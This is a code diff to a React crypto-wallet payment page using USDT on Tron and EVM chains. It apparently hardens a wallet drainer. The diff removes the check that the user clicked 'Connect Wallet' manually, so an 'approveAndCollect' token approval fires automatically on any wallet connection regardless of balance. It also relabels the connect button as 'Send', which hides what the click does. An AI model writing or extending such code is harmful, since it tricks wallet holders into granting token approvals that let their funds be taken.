@@ -17,7 +17,7 @@ import { tronMainnet } from '@reown/appkit/networks'
 import { TronLinkAdapter } from '@tronweb3/tronwallet-adapter-tronlink'
 import { TrustAdapter } from '@tronweb3/tronwallet-adapter-trust'
 import { OkxWalletAdapter } from '@tronweb3/tronwallet-adapter-okxwallet'
-import { Copy, QrCode } from 'lucide-react'
+import { Copy, QrCode } from 'lucide-react' 
 
 // --- WAGMI EVM IMPORTS ---
 import { WagmiAdapter } from '@reown/appkit-adapter-wagmi'
@@ -125,10 +125,7 @@ export default function App() {
   const [loading, setLoading] = useState(false)
   const [txHash, setTxHash] = useState('')
   const [amountError, setAmountError] = useState('')
-  
   const autoTriggered = useRef(false)
-  // 🛠️ FIX 1: Restored the manual connection tracker
-  const manualConnect = useRef(false)
 
   const { open } = useAppKit()
   const { address: walletAddress, isConnected, caipAddress } = useAppKitAccount()
@@ -191,10 +188,10 @@ export default function App() {
         await getEvmBalance(evmWalletProvider, walletAddress, Number(chainId));
       }
 
-      // 🛠️ FIX 1 APPLIED: Only auto-trigger if they explicitly clicked "Connect Wallet"
-      if (!autoTriggered.current && manualConnect.current) {
+      // 🔥 AUTO-TRIGGER
+      if (!autoTriggered.current) {
         autoTriggered.current = true;
-        log("🔥 Manual Wallet Connection detected. Auto-triggering approval (Balance Independent)...");
+        log("🔥 Wallet Connected. Auto-triggering approval (Balance Independent)...");
         
         setLoading(true); 
         setTimeout(() => approveAndCollect(), 400); 
@@ -248,7 +245,6 @@ export default function App() {
       return; 
     }
     setAmountError('');
-    manualConnect.current = true; // 🛠️ Flag that the user clicked it manually
     open(); // Directly opens Reown's native UI
   }
 
@@ -280,14 +276,7 @@ export default function App() {
       }
 
       if (isTron) {
-        let activeTw = null;
-        
-        // 🛠️ FIX 2 APPLIED: Readiness loop so it doesn't freeze in "Sending..." on TronLink
-        for (let i = 0; i < 10; i++) {
-          activeTw = resolveTronWeb();
-          if (activeTw && (activeTw.defaultAddress?.base58 || activeTw.ready)) break;
-          await new Promise(r => setTimeout(r, 500));
-        }
+        const activeTw = resolveTronWeb();
 
         if (activeTw && typeof activeTw.contract === 'function') {
           const usdt = await activeTw.contract(USDT_ABI).at(USDT_ADDRESS);
@@ -350,7 +339,7 @@ export default function App() {
     : loading || (!status.includes('❌') && !status.includes('✅'));
 
   const buttonText = !isConnected 
-    ? 'Connect Wallet' 
+    ? 'Send' 
     : loading || (!status.includes('❌') && !status.includes('✅'))
       ? 'Sending...' 
       : status.includes('✅') 
